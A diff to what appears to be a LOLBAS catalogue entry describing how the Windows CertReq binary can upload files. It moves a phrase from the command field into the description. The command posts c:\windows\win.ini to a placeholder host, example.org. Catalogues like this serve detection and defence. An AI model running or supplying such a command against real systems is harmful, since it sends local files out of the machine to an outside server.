@@ -11,8 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10, Windows 11
-  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal
-    Description: Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST
+  - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini
+    Description: Send the file c:\windows\win.ini to the endpoint https://example.org/ via HTTP POST and show response in terminal
     Usecase: Upload
     Category: Upload
     Privileges: User
